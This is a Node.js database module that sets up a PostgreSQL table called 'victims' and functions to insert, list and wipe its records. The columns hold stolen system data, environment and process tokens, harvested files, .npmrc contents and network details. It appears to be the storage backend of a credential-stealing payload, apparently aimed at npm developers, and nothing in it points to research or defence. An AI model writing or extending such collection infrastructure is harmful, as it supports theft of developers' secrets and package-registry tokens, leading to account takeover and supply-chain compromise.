const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL?.includes('neon.tech') ? { rejectUnauthorized: false } : undefined,
});

const SCHEMA = `
CREATE TABLE IF NOT EXISTS victims (
  id            SERIAL PRIMARY KEY,
  time          TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  system        JSONB NOT NULL DEFAULT '{}',
  env_files     JSONB NOT NULL DEFAULT '[]',
  env_tokens    JSONB NOT NULL DEFAULT '{}',
  proc_tokens   JSONB NOT NULL DEFAULT '{}',
  files         JSONB NOT NULL DEFAULT '[]',
  npmrc         TEXT,
  network       JSONB NOT NULL DEFAULT '[]',
  raw_payload   JSONB
);`;

async function initDB() {
  await pool.query(SCHEMA);
}

async function insertVictim(v) {
  const { rows } = await pool.query(
    `INSERT INTO victims (time, system, env_files, env_tokens, proc_tokens, files, npmrc, network, raw_payload)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
     RETURNING *`,
    [
      v.time,
      JSON.stringify(v.system),
      JSON.stringify(v.env_files),
      JSON.stringify(v.env_tokens),
      JSON.stringify(v.proc_tokens),
      JSON.stringify(v.files),
      v.npmrc,
      JSON.stringify(v.network),
      JSON.stringify(v),
    ]
  );
  return rows[0];
}

async function getAllVictims() {
  const { rows } = await pool.query('SELECT * FROM victims ORDER BY id ASC');
  return rows;
}

async function resetVictims() {
  const { rows } = await pool.query('SELECT COUNT(*)::int AS count FROM victims');
  const count = rows[0].count;
  await pool.query('TRUNCATE victims RESTART IDENTITY');
  return count;
}

module.exports = { pool, initDB, insertVictim, getAllVictims, resetVictims };
